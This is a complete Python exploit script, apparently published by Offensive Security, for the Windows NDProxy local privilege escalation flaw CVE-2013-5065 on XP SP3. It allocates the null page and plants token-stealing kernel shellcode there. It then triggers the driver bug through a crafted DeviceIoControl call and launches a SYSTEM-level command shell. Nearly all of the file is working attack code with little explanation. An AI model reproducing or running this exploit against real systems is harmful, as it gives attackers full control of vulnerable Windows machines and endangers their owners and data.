# NDPROXY Local SYSTEM privilege escalation
# http://www.offensive-security.com
# Tested on Windows XP SP3
# http://www.offensive-security.com/vulndev/ndproxy-local-system-exploit-cve-2013-5065/


# Original crash ... null pointer dereference
# Access violation - code c0000005 (!!! second chance !!!)
# 00000038 ??              ???

from ctypes import *
from ctypes.wintypes import *
import os, sys

kernel32 = windll.kernel32
ntdll = windll.ntdll

GENERIC_READ     = 0x80000000
GENERIC_WRITE    = 0x40000000
FILE_SHARE_READ  = 0x00000001
FILE_SHARE_WRITE = 0x00000002
NULL = 0x0
OPEN_EXISTING = 0x3
PROCESS_VM_WRITE            = 0x0020
PROCESS_VM_READ             = 0x0010
MEM_COMMIT                  = 0x00001000
MEM_RESERVE                 = 0x00002000
MEM_FREE                    = 0x00010000
PAGE_EXECUTE_READWRITE      = 0x00000040
PROCESS_ALL_ACCESS          = 2097151
FORMAT_MESSAGE_FROM_SYSTEM  = 0x00001000
baseadd = c_int(0x00000001)
MEMRES = (0x1000 | 0x2000)
MEM_DECOMMIT = 0x4000
PAGEEXE = 0x00000040
null_size = c_int(0x1000)
STATUS_SUCCESS = 0

def log(msg):
    print msg

def getLastError():
    """[-] Format GetLastError"""
    buf = create_string_buffer(2048)
    if kernel32.FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL,
            kernel32.GetLastError(), 0,
            buf, sizeof(buf), NULL):
        log(buf.value)
    else:
        log("[-] Unknown Error")

print "[*] Microsoft Windows NDProxy CVE-2013-5065 0day"
print "[*] Vulnerability found in the wild"
print "[*] Coded by Offensive Security"       
        
tmp = ("\x00"*4)*5 + "\x25\x01\x03\x07" + "\x00"*4 + "\x34\x00\x00\x00" + "\x00"*(84-24)
InBuf = c_char_p(tmp)

dwStatus = ntdll.NtAllocateVirtualMemory(0xFFFFFFFF, byref(baseadd), 0x0, byref(null_size), MEMRES, PAGEEXE)
if dwStatus != STATUS_SUCCESS:
    print "[+] Something went wrong while allocating the null paged memory: %s" % dwStatus
    getLastError()
written = c_ulong()
sh = "\x90\x33\xC0\x64\x8B\x80\x24\x01\x00\x00\x8B\x40\x44\x8B\xC8\x8B\x80\x88\x00\x00\x00\x2D\x88\x00\x00\x00\x83\xB8\x84\x00\x00\x00\x04\x75\xEC\x8B\x90\xC8\x00\x00\x00\x89\x91\xC8\x00\x00\x00\xC3"
sc = "\x90"*0x38 + "\x3c\x00\x00\x00" + "\x90"*4 + sh + "\xcc"*(0x400-0x3c-4-len(sh))
alloc = kernel32.WriteProcessMemory(0xFFFFFFFF, 0x00000001, sc, 0x400, byref(written))
if alloc == 0:
    print "[+] Something went wrong while writing our junk to the null paged memory: %s" % alloc
    getLastError()

dwRetBytes = DWORD(0)
DEVICE_NAME   = "\\\\.\\NDProxy"
hdev = kernel32.CreateFileA(DEVICE_NAME, 0, 0, None, OPEN_EXISTING , 0, None)
if hdev == -1:
	print "[-] Couldn't open the device... :("
	sys.exit()
kernel32.DeviceIoControl(hdev, 0x8fff23cc, InBuf, 0x54, InBuf, 0x24, byref(dwRetBytes), 0)
kernel32.CloseHandle(hdev)
print "[+] Spawning SYSTEM Shell..."
os.system("start /d \"C:\\windows\\system32\" cmd.exe")